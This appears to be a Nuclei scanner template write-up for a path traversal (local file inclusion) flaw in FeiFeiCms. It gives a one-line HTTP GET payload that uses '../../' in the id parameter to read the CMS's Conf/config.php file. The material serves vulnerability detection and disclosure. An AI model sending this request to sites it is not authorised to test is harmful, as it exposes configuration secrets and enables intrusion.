# Nuclei Template: FeiFeiCms - Local File Inclusion
**Template ID:** feifeicms-lfr
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`feifeicms-lfr.yaml`)

## Vulnerability Information & PoC

## Description
FeiFeiCms is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php
```

## References
- https://www.cnblogs.com/jinqi520/p/10202615.html
- https://gitee.com/daicuo/feifeicms
